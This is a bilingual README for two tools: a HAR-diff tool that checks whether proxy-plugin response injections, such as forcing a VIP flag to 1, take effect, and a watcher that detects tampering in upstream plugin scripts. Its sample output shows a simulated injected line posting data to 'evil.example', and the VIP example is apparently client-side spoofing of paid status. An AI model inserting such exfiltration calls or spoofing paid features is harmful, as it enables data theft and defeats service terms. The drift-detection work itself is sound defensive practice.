# tools · 抓包对比工具 · HAR Diff Tool

## har-diff.py — 抓包对比 · HAR Diff

对比两份 HAR，输出「插件改了哪些字段」并**检测无效改动**。

### 为什么需要它 · Why

Loon 插件改响应体时，**「注入成功」不等于「生效」**。

2026-09-27 踩过的坑：空间页响应里有**两份 `vip`** ——

| | 注入前 | 注入后 | 谁在读 |
|---|---|---|---|
| `data.vip.vipStatus` | 无字段 | `1` | 其他页面 |
| **`data.card.vip.vipStatus`** | **`0`** | **`0`** | **主页顶栏** |

字段值全对，**但写在没人读的字段上** —— 顶栏一直显示灰色，连改两版才通过抓包对比定位。

这个坑靠读代码发现不了，**只能靠「注入前 vs 注入后」的抓包对比**。

### 用法 · Usage

```bash
# 插件关 vs 插件开
python3 har-diff.py baseline.har modified.har

# 只列端点
python3 har-diff.py --list modified.har

# 只看某端点
python3 har-diff.py baseline.har modified.har --endpoint /x/v2/space

# 机器可读
python3 har-diff.py baseline.har modified.har --json
```

### 输出 · Output

```
▌/x/v2/space   +22 -0 ~1
     + data.vip.vipStatus = 1
     ⚠ vipStatus 两处不一致：
        data.card.vip.vipStatus = 0   (未跟随)
        data.vip.vipStatus = 1         (本次已改)
       若 App 读后者，前者改动不会生效
```

**`⚠` 是核心** —— 它把「改了 A 副本却漏了孪生副本 B」直接指出来。

### 检测规则 · Detection rules

1. **base64 自动解码** —— iOS 抓包的 `content.text` 常是 base64
2. **递归拍平** —— `data.card.vip.vipStatus` 变成点路径，逐字段对比
3. **孪生字段检测** —— 同名字段分布在多个容器时（`data.vip` ↔ `data.card.vip`），
   **改完后值不一致**就报警。判据是「值是否一致」而非「是否被碰过」
   —— 值本来就对、被重复写入，同样算一致，不该误报
4. **容器末段约束** —— 只比较 `data.vip` ↔ `data.card.vip` 这类孪生，
   否则 `text`/`name` 这类叶子会满树误报
5. **端点集合校验** —— 两次抓包范围不同会提示，对比结果不可靠

### 验证 · Regression

用 2026-09-27 的真实抓包回归：

| 对比 | 警告数 | 结论 |
|---|---|---|
| 基线 vs v7.10（有 bug） | **11** | 精准命中 `vipStatus` / `label_theme` / `text` |
| 基线 vs v7.11（已修） | **1** | 残留提示 |

---

## external-watch.py — 外部资源巡检 · External Resource Watch

盯住**每次联网都现取**的那些资源：`script-path=` 的 JS、插件清单、图标。
清单层改不动的风险就在这里 —— 同一条订阅地址可以在你毫无察觉的情况下换掉内容，
而插件已经装在设备上了。

### 和 vendor-check.py 的分工 · Why two tools

| | `vendor-check.py` | `external-watch.py` |
|---|---|---|
| 问的问题 | **我托管的这份**有没有被人动过？上游有没有出新版本？ | **上游站点上那份**有没有被人动过？ |
| 取样对象 | 本仓库里的文件 | 远程 URL |
| 需要网络 | `--hash` 不用 | 一直要 |

两者**不是重复**：一个防仓库被改，一个防上游作者改。托管的意义是「上游没了也能用」，
但托管之后上游会继续更新 —— 想知道它什么时候动了，就用这个。

### 用法 · Usage

```bash
python3 external-watch.py --check          # 比对基线，有漂移/拉取失败退出码 1
python3 external-watch.py --check --diff    # 顺便把文本资源改了什么打出来
python3 external-watch.py --pin            # 看过 diff 之后重建基线
```

`--diff` 的输出长这样（模拟上游往脚本里插一行外发代码）：

```
⚠ reven-script   已漂移        4369 B  (4369 → 4369)
    基线 0000000000000000…  →  线上 425c476e04fc84a0…
    唯一带代码的外部文件。转发目标与剥 header 的白名单都在里面
    --- 基线
    +++ 线上
    @@ -97,4 +97 @@
     }
    -
    -// 恶意新增行
    -$httpClient.post({url:"https://evil.example/x"},…);
```

### 三条设计取舍 · Design notes

1. **默认 `-k` 跳过证书校验**。本机跑 Loon 时出站被 Loon 自己 MITM，
   证书是 `O=Loon`，不跳过连不上任何外部 https（实测）。判定漂移靠 sha256 比内容，
   不依赖证书链；真要验链加 `--strict-tls`。
2. **拉取失败也退 1**。第一版把「站点 404」当无事发生，打出「全部与基线一致」还退 0 ——
   **站点消失恰恰是要处理的头等事故，不能报绿**。
3. **文本资源存快照**（`tools/.snapshots/`），因为只告诉你「变了」没用，
   得让人看得懂变了什么。图标不存，只比哈希。

### 基线 · Baseline

[`external-watch.json`](external-watch.json)，2026-09-29 建立，含 3 个资源
（插件清单、脚本、图标）。基线里可以放多个插件的资源，**不只 Reven-Mirror 一个**。

---

## 踩坑记录 · Post-mortems

- **`len(SNAP)` 崩在写回基线之后**：第一版 `--pin` 的收尾打印拿 `Path` 取长度，
  `TypeError` 抛在 `write_text()` **之后** —— 崩了但数据已写。
  属于「失败方式本身是坏的」：报错信息会让人以为 pin 没成功，于是再 pin 一次。
  凡是把「写文件」和「报告结果」放在同一个函数里，写文件必须排在最后一步。
- **用「改快照」模拟漂移测不出东西**：我往 `tools/.snapshots/` 里追加一行想触发告警，
  结果 `--check` 照样全绿 —— 快照只服务于 `--diff`，**漂移判定读的是 JSON 里的 sha256**。
  正解是改 registry 里的哈希值，测试要看的是**被断言的那条路径**。
